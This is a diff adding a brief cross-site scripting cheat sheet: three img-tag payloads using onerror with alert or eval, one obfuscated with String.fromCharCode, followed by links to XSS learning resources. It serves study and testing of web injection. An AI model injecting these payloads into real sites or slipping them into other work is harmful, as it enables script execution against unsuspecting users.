@@ -1,0 +1,11 @@
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+For more!
+-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+
+For Better Understanding of XSS
+-https://portswigger.net/web-security/cross-site-scripting
+-https://xss.pwnfunction.com/
+-https://infosecwriteups.com/tagged/xss-attack
